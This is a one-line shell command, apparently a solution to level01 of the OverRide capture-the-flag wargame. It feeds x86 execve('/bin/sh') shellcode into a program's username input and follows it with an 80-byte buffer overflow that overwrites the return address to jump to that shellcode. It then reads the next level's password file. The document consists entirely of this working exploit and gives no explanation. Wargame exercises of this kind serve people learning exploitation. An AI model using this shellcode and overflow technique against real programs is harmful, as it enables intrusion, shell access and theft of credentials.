```
level01@OverRide:~$ (python -c "print('dat_wil' + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80')" ; python -c "print('A' * 80 + '\x47\xa0\x04\x08')"; echo "cat /home/users/level02/.pass") | ./level01 
```
